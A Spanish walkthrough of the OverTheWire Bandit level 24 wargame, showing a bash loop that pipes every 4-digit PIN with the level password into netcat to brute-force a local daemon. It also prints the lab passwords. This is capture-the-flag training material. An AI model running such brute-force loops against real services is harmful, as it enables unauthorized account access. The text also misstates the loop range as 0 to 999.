
## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.
No es necesario crear nuevas conexiones cada vez.
## Datos de usuario del nivel anterior
Usuario: ssh bandit24@bandit.labs.overthewire.org -p 2220
Contraseña: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solución 
1.- Primero comenzamos cambiando de directorio como se hizo en nuestro nivel anterior:
`bandit24@bandit:~$ cd /etc/cron.d`
`bandit24@bandit:/etc/cron.d$ ls`
`cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat`
`cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir``
Aquí hice una prueba tratando de ejecutar lo siguiente:
`cat /etc/cron.d/conjob_bandit25_root`
Pero obviamente, nos iba a marcar un error. Entonces para está solución cree un script en un directorio temporal.
Para ello los comandos anterires no nos ayudan, nos situamos en `tmp` que es una carpeta que nos permite realizar las tareas correctamente:

`bandit24@bandit:~$ cd /tmp`
`bandit24@bandit:/tmp$`

2.- Mediante el comando mkdir, creamos un directorio en donde guardaremos nuestro script:
`bandit24@bandit:/tmp$ mkdir bandi24`
3.- Ahora mediante el comando nano con la extensión de SH creamos nuestro script: 
`bandit24@bandit:/tmp/bandi24$ nano pass.sh`
4.- Una vez ahí pondremos a través de un ciclo for nuestra condición que cicle desde la posición 0 hasta la 999 así dando las mil posibles combinaciones posibles que nos pueden generar el pin correcto para la contraseña:
#!/bin/bash

for i in {0000..9999}

do

                echo " VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" //Cabe recalcar que aquí hace el ciclo con la contraseña del nivel anterior hasta coincidir con el correcto

done
5.- Mediante chmod establecemos los permisos necesarios al usuario así como su vez ejecutamos nuestro script:
`bandit24@bandit:/tmp/bandi24$ chmod u+x pass.sh`

6.- Finalmente a nuestro script lo ejectuamos concatenando con un nc para poder comunicarnos con el puerto mencionado en el objetivo,  acompañado de un grep para que nuestro script haga la tarea de comparar todos y haga la execepción en nuestro pin indicado que no venga acompañado de la cadena "Wrong":
`bandit24@bandit:/tmp/bandi24$ ./pass.sh | nc localhost 30002 | grep -v "Wrong"`
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
Cabe recalcar que aquí se inserta nuestra contraseña, del nivel anterior para poder mandarnos la siguiente
## `Contraseña obtenida en este nivel 
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
## Notas 
Es importante saber el uso del comando Chmod ya que tiene muchas variables, pero hay que saber distinguir para que son cada una de ellas, por ejemplo en el nivel anterior usamos la línea chmod 777 que nos permite, lectura, ejecución y escritura dentro de este. En este caso usamos la u+x la cual nos permite por la parte de x ejecutar nuestro script y la u nos sirve para otorgar permisos al usuario. 
## Referencias 
https://docs.oracle.com/cd/E19620-01/805-7644/6j76klop3/index.html#:~:text=grep%20se%20utiliza%20muy%20a,de%20comunicaci%C3%B3n%20es%20%22%20%7C%20%22.
https://www.ibm.com/docs/es/aix/7.1?topic=c-chmod-command#chmod__row-d3e95704
https://gospelidea.com/blog/que-son-los-permisos-chmod#:~:text=Los%20permisos%20CHMOD%20a%20trav%C3%A9s,incluye%20servidores%20dedicados%20o%20VPS.
